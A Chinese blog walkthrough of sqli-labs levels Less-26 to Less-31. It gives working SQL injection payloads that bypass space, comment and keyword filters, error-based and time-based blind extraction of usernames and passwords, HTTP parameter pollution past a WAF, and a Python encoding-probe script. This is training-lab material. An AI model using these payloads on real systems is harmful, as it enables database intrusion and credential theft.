<h2 id="Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us"><a href="#Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us" class="headerlink" title="Less-26: GET - Error based - All your SPACES and COMMENTS belong to us"></a>Less-26: GET - Error based - All your SPACES and COMMENTS belong to us</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1 显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1’--+ 无法正常显示，代码中过滤了注释符--+  # ，空格，正反斜杠</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1’ ;%00 此时显示正常，说明存在注入漏洞</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1‘ || ’1‘&#x3D;‘1 也可以作为一个验证</span><br><span class="line">5. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26&#x2F;?id&#x3D;1‘ union select 1,2,3;%00 报错，通过tips发现，union和select之间没有空格</span><br><span class="line">6. 在win下因为转码问题，无法使用空格替换的情况。</span><br><span class="line">7.  先不管空格替换的情况，先使用报错注入进行测试。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">当我们不考虑空格，使用报错注入的时候：</span><br><span class="line">1. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, ( database()  ) ),1)  || ’1‘&#x3D;‘1 使用这种方式可以得到我们的当前数据库</span><br><span class="line">2. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, (select  (group_concat(table_name)) from  (infoorrmation_schema.tables) where (table_schema &#x3D; 0x7365637572697479)  ) ),1)  || ’1‘&#x3D;‘1  这样我们可以取得表信息。</span><br><span class="line">3.  http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name &#x3D; 0x7573657273)  ) ),1) || ’1‘&#x3D;‘1   通过这个我们取得字段的值</span><br><span class="line">4. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  ) ),1) || ’1‘&#x3D;‘1 取出字段的值，但是取出的值很少，不完整。</span><br><span class="line">5. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1‘  || updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  where (id&#x3D;2) ) )   ,1) || ’1‘&#x3D;‘1  通过改变id的值可以遍历所有的数据。</span><br><span class="line">以上的方法中，因为不能使用空格，所以采用报错注入的形式。我们如果使用字符进行替换呢？将空格替换为编码字符如何解决？</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>空格替换</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考链接：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;tags&#x2F;html_ref_urlencode.html</span><br><span class="line">当我们使用%a0充当空格替换的时候：</span><br><span class="line">http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-26&#x2F;?id&#x3D;1&#39; %a0%a0%a0%a0 oorrder %a0by%a0;%00</span><br><span class="line">这个时候我们直接将所有的空格进行替换即可，注释符可以使用;%00或者是使用  || ‘1’&#x3D;‘1即可完成注入</span><br></pre></td></tr></table></figure>

<p><strong>脚本</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    code = hex(i).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(code) &lt; <span class="number">2</span>:</span><br><span class="line">        code = <span class="string">&quot;0&quot;</span> + code</span><br><span class="line">    code_0x = <span class="string">&quot;%&quot;</span> + code</span><br><span class="line">    <span class="comment"># print(code_0x)</span></span><br><span class="line">    url = <span class="string">&quot;http://121.199.30.46/Less-26/?id=1&#x27;&quot;</span> + code_0x + <span class="string">&quot;%26%26&quot;</span> + code_0x  + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">    r = requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>):</span><br><span class="line">        print(code_0x)</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h2 id="Less-26A-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-String-single-quotes-Parenthesis"><a href="#Less-26A-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-String-single-quotes-Parenthesis" class="headerlink" title="Less-26A: GET -Blind Based - All your SPACES and COMMENTS belong to us-String-single quotes-Parenthesis"></a>Less-26A: GET -Blind Based - All your SPACES and COMMENTS belong to us-String-single quotes-Parenthesis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26a&#x2F;?id&#x3D;1 返回数据正常</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26a&#x2F;?id&#x3D;1’ 此时没有数据返回</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-26a&#x2F;?id&#x3D;1’) ;%00此时我们可以得到返回正常的数据</span><br><span class="line">因为windows的原因，我们使用linux搭建的靶机进行接下来的操作：</span><br><span class="line">4. 代码中  &#x2F;&#x2F;print_r(mysql_error()); 屏蔽了返回的错误，所以这里我们不能使用报错注入。我们使用联合查询注入</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-26a&#x2F;?id&#x3D;111‘) %a0 union %a0 select %a0  1,2,3;%00 直接将所有的空格替换为%a0,根据hint得到可以回显的位置。(特别感谢网络上无偿提供搭建环境的人，感谢您的帮助)</span><br><span class="line">6. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-26a&#x2F;?id&#x3D;111‘) %a0 union %a0 select %a0  1,2,group_concat(schema_name)  %a0 from %a0  infoorrmation_schema.schemata     ;%00  获取所有的数据库</span><br><span class="line">7. 记得空格使用%a0进行替换，不要直接复制ppt，因为里面的英文逗号会被转成中文的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-27-GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-A"><a href="#Less-27-GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-A" class="headerlink" title="Less-27: GET- Error Based-All your UNION &amp; SELECT Belong to us - String -Single quote A"></a>Less-27: GET- Error Based-All your UNION &amp; SELECT Belong to us - String -Single quote A</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1 有数据</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1’ 此时报错，说明可能存在注入</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘;%00 成功将单引号进行闭合掉，说明存在注入</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘   %a0 order %a0  by  %a0  3    ;%00  根据hint可以进行这样的order by</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘   %a0 union  %a0  select  %a0 1, 2, 3    ;%00 此时返回错误，我们看下源码</span><br><span class="line">发现union select等关键字被替换为空，我们尝试大小写混合</span><br><span class="line">6. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘   %a0 uNion  %a0  sElect  %a0 1, 2, 3    ;%00 此时返回正常数据</span><br><span class="line">7. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;111‘   %a0 uNion  %a0  sElect  %a0 1, 2, group_concat(schema_name)  %a0  from  %a0 information_schema.schemata    ;%00  拿到所有的数据库，一定要留意hint的提示</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">法二：使用报错注入</span><br><span class="line">1. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-27&#x2F;?id&#x3D;1‘    %a0  ||    %a0   updatexml(1, concat(0x7e, ( database()  ) ), 1)  %a0  || ’1‘&#x3D;‘1  首先拿到数据库名称</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘  %a0 ||  updatexml(1, concat(0x7e, (  SEleCt %a0  schema_name  %a0 from  %a0   information_schema.schemata  %a0 limit %a0 1,1  ) ),1)  || %a0  ’1’&#x3D;‘1  通过这样查，可以拿到所有的库信息。</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘  %a0 ||  updatexml(1, concat(0x7e, (  SEleCt %a0  table_name  %a0 from  %a0   information_schema.tables %a0 where %a0 table_schema &#x3D;  0x7365637572697479 %a0 limit %a0 1,1  ) ),1)  || %a0  ’1‘&#x3D;‘1 通过遍历所有的表的值</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1‘  %a0 ||  updatexml(1, concat(0x7e, ( SEleCt %a0  column_name %a0  from %a0  information_schema.columns %a0  where %a0   table_name &#x3D; 0x7573657273  %a0 limit %a0 1,1  ) ),1)  || %a0  ’1‘&#x3D;‘1 通过遍历取出所以都字段</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1&#39;  %a0 ||  updatexml(1, concat(0x7e, (SElect %a0  concat_ws(0x7e,username,password) from  %a0  security.users  %a0 limit %a0 1,1  ) ),1)  || %a0 &#39;1&#39;&#x3D;‘1</span><br><span class="line"> 通过遍历的方法取出里面所有的字段值。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-27a-A-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-Double-Quotes"><a href="#Less-27a-A-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-Double-Quotes" class="headerlink" title="Less-27a: . A GET -Blind Based- All your UNION &amp; SELECT Belong to us - Double Quotes"></a>Less-27a: . A GET -Blind Based- All your UNION &amp; SELECT Belong to us - Double Quotes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1 有数据</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27&#x2F;?id&#x3D;1’ 此时没有报错，我们将显示sql语句的代码加到代码中。</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1“;%00  此时显示正常，但是报错的信息不会显示在代码中。</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2,3     ;%00 得到数据可以回显的位置。</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(schema_name) from    %a0  information_schema.schemata     ;%00 取出了所有的库</span><br><span class="line">6. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(table_name) from  %a0    information_schema.tables %a0    where  %a0    table_schema &#x3D; 0x7365637572697479     ;%00 取出了所有的表</span><br><span class="line">7. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(column_name) %a0  from %a0 information_schema.columns  %a0 where %a0  table_name &#x3D; 0x7573657273    ;%00 取出了所有的字段名</span><br><span class="line">8. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ %a0  uNIon  %a0   sElEct  %a0    1,2, group_concat(concat_ws(0x7e,username,password))  %a0  from  %a0  security.users  ;%00 取出所有的字段值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法二：使用基于时间的盲注  其中%26%26 代表 &amp;&amp;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1“ %26%26 if( length(database())&gt;1, 1, sleep(5)    )  %26%26 %0a  ”1“&#x3D;”1 </span><br><span class="line">注意：在句子后面不能使用or，因为使用or的情况下，无论如何情况返回都会是真。</span><br><span class="line">http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1“ %26%26 if( length(database())&gt;1, 1, sleep(5)    )  || %0a  ”1“&#x3D;”1  这种写法是错误的</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-27a&#x2F;?id&#x3D;1111“ || if( length(database())&#x3D;1, 1, sleep(5)    )  %26%26  %0a  ”1“&#x3D;”1 这样写也是可以的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-28：GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-with-parenthesis"><a href="#Less-28：GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-with-parenthesis" class="headerlink" title="Less-28：GET -Error Based- All your UNION &amp; SELECT Belong to us - String -Single quote with parenthesis"></a>Less-28：GET -Error Based- All your UNION &amp; SELECT Belong to us - String -Single quote with parenthesis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1 显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1’ 此时显示不正常，说明可能存在注入漏洞</span><br><span class="line">接下来就是坑来了：</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1‘ || ’1‘&#x3D;‘1  这个时候数据回显正常</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1‘  %a0   union %a0   select %a0  1,2,3      || ’1‘&#x3D;‘1  这个正常的操作但是显示确实错误的？  我们将   ||进行替换一下</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1‘  %a0   union %a0   select %a0  1,2,3     ;%00  还是显示错误的</span><br><span class="line"></span><br><span class="line">问题在哪？</span><br><span class="line">通过查看源代码可知：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-28&#x2F;?id&#x3D;1‘   || ’1‘&#x3D;‘2 查询的sql语句：SELECT * FROM users WHERE id&#x3D;(&#39;1&#39;||&#39;1&#39;&#x3D;&#39;2&#39;) LIMIT 0,1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mysql命令行执行下面的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">我们在mysql命令行中执行以下命令：</span><br><span class="line"> 1. select * from users ;  显示所有的数据</span><br><span class="line">2. select true ;   返回结果是1，也就是代表正确</span><br><span class="line">3. select false;  返回结果是0，代表着错误</span><br><span class="line">4. select (2  and 1&#x3D;2); 返回结果是 0</span><br><span class="line">5. select (2  or 1&#x3D;2);  返回结果是 1</span><br><span class="line">6. select * from users where id&#x3D;(1); 此时返回第一列数据</span><br><span class="line">7. select * from users where id&#x3D;(true); 此时返回也是第一列</span><br><span class="line">以上问题说明，我们的id值处理有问题，正确的语句应该是：</span><br><span class="line"> SELECT * FROM users WHERE id&#x3D;(&#39;1&#39;||&#39;1&#39;&#x3D;&#39;2&#39;) LIMIT 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>基于时间的盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基于时间的盲注</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)  %a0   %26%26 if( length(database())&gt;1, 1, sleep(5)    ) ;%00 </span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)  %a0   %26%26 if( length(database())&gt;1, 1, sleep(5)    )  %26%26  (&#39;1&#39;)&#x3D;(‘1</span><br><span class="line">这两种都是可以的</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-28a：-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-single-quote-parenthesis"><a href="#Less-28a：-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-single-quote-parenthesis" class="headerlink" title="Less-28a： GET - Blind Based- All your UNION &amp; SELECT Belong to us-single quote-parenthesis"></a>Less-28a： GET - Blind Based- All your UNION &amp; SELECT Belong to us-single quote-parenthesis</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1 此时显示正常</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1’ 有报错，可能存在注入</span><br><span class="line">3. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1‘)  %a0 order  %a0  by %a0  3 ;%00  利用order by语句得到一共有3列。</span><br><span class="line">4. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1111‘) %a0 union   %a0  select  %a0  1,2,3 ;%00  此时得到数据可以显示的位置。</span><br><span class="line">5. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1111‘) %a0 union   %a0  select  %a0  1,2,group_concat(schema_name) %a0  from  %a0   information_schema.schemata ;%00  得到所有的库</span><br><span class="line">6. 其余的操作和less-27基本无异。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>时间盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基于时间的盲注</span><br><span class="line">1. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;) %a0  or  %a0   if( length(database())&#x3D;8, 1, sleep(5)    ) --+</span><br><span class="line">或者是</span><br><span class="line">2. http:&#x2F;&#x2F;47.100.118.240:8888&#x2F;Less-28a&#x2F;?id&#x3D;1‘) %a0  and  %a0   if( length(database())&#x3D;8, 1, sleep(5)    ) --+  此时要确保前面的id值是可以查到的，不能使用一个不存在的id值。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-29: GET-Error based-IMPIDENCE MISMATCH- Having a WAF in front of web application."></a>Less-29: GET-Error based-IMPIDENCE MISMATCH- Having a WAF in front of web application.</h2><p><strong>环境搭配</strong></p>
<p>•1. 在docker中是无法正常使用第29关的，因为需要搭建jsp服务</p>
<p>•2.我们可以使用jspstudy在本地搭建，端口设置为8080</p>
<p>•3. phpstudy端口设置为80</p>
<p>•4.修改jsp中的文件index.jsp文件的url指向位置到你安装sqli-labs中的less29下</p>
<p><img src="/2020/07/13/sqlo-labs/image-20200524113033880.png" alt="image-20200524113033880"></p>
<p><strong>•http参数污染：</strong>jsp/tomcat使用getgetParameter(“id”)获取到的是第一个值，php/apache使用$_GET[“id”]获取的是第二个值，那么第一个id纯数字，第二个id的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-29&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;3‘  order by 3--+ 说明数据有3列，而且第一个id值无法注入</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-29&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;113‘  union select 1,2, 3  --+ 已经知道数据回显的位置</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-29&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;113‘  union select 1,2, group_concat(schema_name) from    information_schema.schemata --+  此时我们已经取出数据库的名字。</span><br><span class="line">4. 接下来就是常规的操作，和less1基本一致</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-30: GET - BLIND - IMPIDENCE MISMATCH- Having a WAF in front of web application."></a>Less-30: GET - BLIND - IMPIDENCE MISMATCH- Having a WAF in front of web application.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-30&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;1“ order by 3--+  这里显示是正常的，4的时候是不正常的，但是显示异常并没有显示报错的信息。说明无法使用报错注入。</span><br><span class="line">2. 接下里和less29相同</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-30&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;11111&quot; union select 1,2, 3--+</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-30&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;11111“ union select 1,2, group_concat(schema_name) from    information_schema.schemata --+  接下来就是常规操作了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-31-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><a href="#Less-31-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application" class="headerlink" title="Less-31: GET-BLIND -IMPIDENCE MISMATCH- Having a WAF in front of web application"></a>Less-31: GET-BLIND -IMPIDENCE MISMATCH- Having a WAF in front of web application</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-1 &quot;) union select 1,2,3 --+ </span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli_&#x2F;Less-31&#x2F;index.jsp?id&#x3D;1&amp;id&#x3D;-1 &quot;) union select 1,2,group_concat(schema_name) from    information_schema.schemata --+   </span><br><span class="line">操作和前面的基本相同</span><br><span class="line"></span><br></pre></td></tr></table></figure>



